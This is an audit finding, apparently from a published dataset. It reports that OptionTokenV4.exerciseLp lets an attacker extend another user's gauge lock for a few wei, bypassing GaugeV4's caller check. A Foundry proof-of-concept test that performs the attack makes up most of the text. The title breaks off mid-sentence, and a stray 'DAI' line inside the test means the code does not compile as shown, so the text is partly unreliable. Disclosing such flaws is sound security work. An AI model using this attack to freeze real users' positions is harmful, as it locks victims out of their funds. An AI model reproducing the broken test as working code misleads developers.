# [H] DepositWithLock done via OptionToken can be

## Summary
Severity: High
Contest weight: 0.7882
Dataset id: 23103
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
OptionTokenV4.exerciseLp allows depositing to other people locks and extend it permanently at close to zero cost. GaugeV4.depositWithLock has a check to prevent someone else from re-locking a user position. 
https://80eff4bd12578146a844cfd/v4-contracts/contracts/GaugeV4.sol#L443-L445
```solidity
function depositWithLock(address account, uint256 amount, uint256 _lockDuration) external lock {
    require(msg.sender == account || isOToken[msg.sender], "Not allowed to deposit with lock");
    _deposit(account, amount, 0);
}
```
This check can be sidestepped by exercising a position on behalf of a victim via the OptionTokenV4. By doing this, any user can have their position permanently frozen at close to no cost to the attacker. The cost of the attack is 1 wei for each tokens involved (necessary to not revert on addLiquidity), meaning that the cost is extremely low. Victims will be unable to unlock their positions at close to no cost to the attacker. The following POC demonstrates the attack. The attacker spends 3 weis of oToken as well as dust amounts of DAI and Flow to increase the lock duration of the victim.
```solidity
function testExerciseLp_attack() public {
    vm.startPrank(address(owner));
    FLOW.approve(address(oFlowV4), TOKEN_1);
    // mint Option token to owner 2
    oFlowV4.mint(address(owner2), TOKEN_1 - 3);
    address attacker = address(0xb4d);
    FLOW.mint(attacker, 3);
    DAI.mint(attacker, 3);
    oFlowV4.mint(address(attacker), 3);
    /// Not relevant
    washTrades();
    vm.stopPrank();
    uint256 flowBalanceBefore = FLOW.balanceOf(address(owner2));
    uint256 oFlowV4BalanceBefore = oFlowV4.balanceOf(address(owner2));
    uint256 daiBalanceBefore = DAI.balanceOf(address(owner2));
    uint256 treasuryDaiBalanceBefore = DAI.balanceOf(address(owner));
    uint256 rewardGaugeDaiBalanceBefore = DAI.balanceOf(address(gauge));
    (uint256 underlyingReserve, uint256 paymentReserve) = IRouter(router).getReserves(address(FLOW), address(DAI), false);

    uint256 paymentAmountToAddLiquidity = (TOKEN_1 * paymentReserve) / underlyingReserve;

    uint256 discountedPrice = oFlowV4.getLpDiscountedPrice(TOKEN_1, 20);
    /// END Not revlevant
    vm.startPrank(address(owner2));
    DAI.approve(address(oFlowV4), TOKEN_100K);
    oFlowV4.exerciseLp(TOKEN_1 - 3, TOKEN_1 - 3, address(owner2), 20, block.timestamp);

    vm.stopPrank();
    // Check end
    uint256 end = gauge.lockEnd(address(owner2));
    vm.warp(end - 1);
    vm.startPrank(address(attacker));
    FLOW.approve(address(oFlowV4), TOKEN_1);
    DAI.approve(address(oFlowV4), TOKEN_100K);
    oFlowV4.exerciseLp(3, 3, address(owner2), 20, block.timestamp);
    vm.stopPrank();
    uint256 newEnd = gauge.lockEnd(address(owner2));
    DAI
    assertGt(newEnd, end, "delayed");
}
```

## Recommendation
We should not be able to exercise on behalf of someone else AND increase their locks. Whenever the recipient is someone else, the lock should not be increased, or alternatively you remove the functionality and only allow the recipient to exercise.
